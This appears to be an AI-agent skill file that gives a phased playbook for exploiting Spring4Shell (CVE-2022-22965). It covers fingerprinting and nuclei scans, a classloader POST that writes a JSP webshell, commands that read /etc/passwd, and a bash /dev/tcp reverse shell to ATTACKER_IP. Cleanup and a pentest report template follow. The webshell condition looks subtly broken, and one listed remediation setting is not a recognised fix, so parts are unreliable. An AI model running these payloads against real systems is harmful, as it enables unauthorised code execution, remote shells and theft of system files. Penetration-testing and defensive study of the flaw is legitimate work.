---
name: vuln-spring4shell
description: "Spring4Shell (CVE-2022-22965) detection and exploitation. JSP webshell via classloader pattern, nuclei detection, Spring/Tomcat fingerprinting, WAR deployment RCE. Triggers: 'spring4shell', 'cve-2022-22965', 'spring rce', 'spring mvc rce', 'spring framework rce', 'tomcat jsp shell', 'classloader exploit', 'spring boot rce'."
---

# Spring4Shell (CVE-2022-22965)

RCE in Spring Framework via classloader data binding on Tomcat/WAR deployments.

**Prerequisites:** Spring Framework < 5.3.18 / < 5.2.20, Java 9+, Tomcat WAR deployment, `spring-webmvc` or `spring-webflux`.

## Install

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates
```

---

## Phase 1: Fingerprinting

```bash
TARGET="https://TARGET"

curl -sI "$TARGET/" | grep -iE "x-application-context|x-powered-by|server:|via"

for ep in "/actuator" "/actuator/env" "/actuator/info" "/actuator/health" \
          "/env" "/info" "/health" "/beans" "/mappings"; do
  STATUS=$(curl -o /dev/null -sk -w "%{http_code}" "$TARGET$ep")
  [ "$STATUS" != "404" ] && echo "[+] $ep → $STATUS"
done

curl -sk "$TARGET/nonexistent" | grep -iE "java|tomcat|spring|servlet"
```

---

## Phase 2: Automated Detection

```bash
TARGET="https://TARGET"
OUTPUT=".omop/engagement/vuln/spring4shell"
mkdir -p "$OUTPUT"

nuclei -t cves/2022/CVE-2022-22965.yaml -u "$TARGET" \
  -o "$OUTPUT/nuclei-results.txt"

nuclei -t technologies/spring.yaml -u "$TARGET"
nuclei -t cves/2022/ -u "$TARGET" -tags spring
```

---

## Phase 3: Manual Exploitation — JSP Webshell

```bash
TARGET_URL="https://TARGET/APP_PATH"
OUTPUT=".omop/engagement/vuln/spring4shell"

PAYLOAD='<%
  if ("cmd".equals(request.getParameter("cmd"))) {
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1; byte[] b = new byte[2048];
    while((a=in.read(b))!=-1){ out.println(new String(b)); }
  }
%>'

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=$PAYLOAD" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" \
  | tee "$OUTPUT/exploit-response.txt"

sleep 2

curl -s "https://TARGET/shell.jsp?cmd=id" | tee "$OUTPUT/rce-proof.txt"
curl -s "https://TARGET/shell.jsp?cmd=cat+/etc/passwd" | tee -a "$OUTPUT/rce-proof.txt"
curl -s "https://TARGET/shell.jsp?cmd=hostname" | tee -a "$OUTPUT/rce-proof.txt"
```

---

## Phase 4: Reverse Shell via Webshell

```bash
ATTACKER_IP="YOUR_IP"
LPORT=4444

nc -lvnp $LPORT &

REVSHELL="bash+-i+>%26+/dev/tcp/$ATTACKER_IP/$LPORT+0>%261"
curl -s "https://TARGET/shell.jsp?cmd=$REVSHELL"

CMD=$(echo "bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1" | base64)
curl -s "https://TARGET/shell.jsp?cmd=echo+$CMD+|+base64+-d+|+bash"
```

---

## Phase 5: Cleanup

```bash
curl -s "https://TARGET/shell.jsp?cmd=rm+-f+webapps/ROOT/shell.jsp"

STATUS=$(curl -o /dev/null -sk -w "%{http_code}" "https://TARGET/shell.jsp")
[ "$STATUS" = "404" ] && echo "[+] Webshell removed"
```

---

## Phase 6: Patch Verification

```bash
curl -sk "https://TARGET/actuator/info" | jq .build.version

```

---

## Report Template

```markdown
## Vulnerability: Spring4Shell (CVE-2022-22965)

**Severity:** Critical (CVSS 9.8)
**Affected:** Spring Framework [VERSION] on Tomcat [VERSION]

### Evidence
- Webshell written to: `https://TARGET/shell.jsp`
- Command output (`id`): `uid=0(root) gid=0(root) groups=0(root)`

### Impact
Unauthenticated Remote Code Execution as the application's OS user.

### Remediation
1. Upgrade Spring Framework to 5.3.18+ or 5.2.20+
2. Upgrade Tomcat to 10.0.20+, 9.0.62+, 8.5.78+
3. If upgrade not possible: `spring.mvc.pathmatch.use-suffix-pattern=false`
4. Restrict classloader binding via `@InitBinder` disallowing `class.*` fields
```

---

## Output

Save to `.omop/engagement/vuln/spring4shell/`:
- `fingerprinting.txt` — Spring/Tomcat version indicators
- `exploit-response.txt` — exploit POST response
- `rce-proof.txt` — command output (id, hostname)

## Next Phase

→ `pentest-exploit` for post-exploitation from obtained shell
→ `pentest-report` for CVE report generation
